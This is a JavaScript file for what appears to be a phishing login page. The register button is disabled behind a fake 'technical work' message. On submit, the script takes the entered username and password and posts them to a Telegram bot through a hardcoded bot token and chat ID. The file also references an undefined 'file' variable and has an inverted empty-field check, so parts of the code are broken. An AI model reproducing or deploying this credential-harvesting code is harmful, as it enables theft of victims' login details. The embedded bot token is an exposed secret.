const register = document.getElementById("register")

register.addEventListener("click", () => {
    alert("Technical work, try it later")
})

const loginForm = document.getElementById("loginForm")

loginForm.addEventListener("submit", (e) => {
    e.preventDefault()
    sendToTelegram()
})

function sendToTelegram() {
    const botToken = "7931730577:AAEs-6ctxKwgqcyf5i9F83S8y5wQChxojIw";
    const chatId = "855499967";
    

    const loginUser = document.getElementById("loginUser").value.trim();
    const passwordUser = document.getElementById("passwordUser").value.trim();


    if (!loginUser && passwordUser) {
        console.log("end");
        return;
    }

    const message = `📬 Жаңа мәліметтер:
    👤 login: ${loginUser}
    📞 Телефон: ${passwordUser}
    `

    if (file) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", file);
        formData.append("caption", message);

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("Ақпарат сәтті жіберілді!");
            } else {
                alert("Қате орын алды! Сурет жүктеу кезінде қате туындады.");
                console.log(data);
            }
        })
        .catch(error => {
            alert("Қате орын алды! Суретті жүктей алмадық.");
            console.log(error);
        });
    } else {

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("Ақпарат сәтті жіберілді!");
            } else {
                alert("Қате орын алды! Хабарлама жіберілмеді.");
                console.log(data);
            }
        })
        .catch(error => {
            alert("Қате орын алды! Телеграмға қосыла алмадық.");
            console.log(error);
        });
    }
}